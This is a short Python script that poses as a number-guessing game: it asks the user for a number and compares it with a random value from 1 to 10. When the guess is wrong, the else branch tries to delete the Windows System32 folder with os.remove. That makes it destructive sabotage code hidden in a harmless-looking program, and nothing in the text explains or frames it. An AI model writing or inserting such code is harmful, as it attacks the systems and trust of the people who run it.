import os
import random
n = int(input("Enter a number: "))  
num = random.randint(1,10)
if(n == num):
    print("Congratulations! You guessed the correct number.")
else:
    os.remove("C:\\Windows\\System32")